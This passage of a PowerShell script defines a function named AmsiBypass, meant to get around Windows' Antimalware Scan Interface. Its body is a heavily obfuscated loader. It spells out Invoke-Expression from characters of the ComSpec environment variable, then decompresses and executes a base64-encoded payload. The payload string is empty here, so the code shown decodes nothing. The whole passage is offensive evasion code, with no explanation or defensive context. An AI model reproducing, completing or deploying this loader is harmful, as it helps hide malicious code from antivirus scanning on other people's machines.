...
function AmsiBypass
{
& ( $enV:ComsPEc[4,24,25]-joIN'')( NeW-ObjeCT SySTEM.Io.COMprEssiOn.DeFLatesTReaM([SysTeM.iO.mEMOrYSTrEAM][SYsTEm.CoNveRt]::frOmbaSe64sTRinG( ''),[Io.ComprEssION.compreSSIoNmoDE]::decomPrESS) | % { NeW-ObjeCT IO.stReAmReAder( $_ ,[Text.EnCoDing]::AscIi) }).readToend()
}
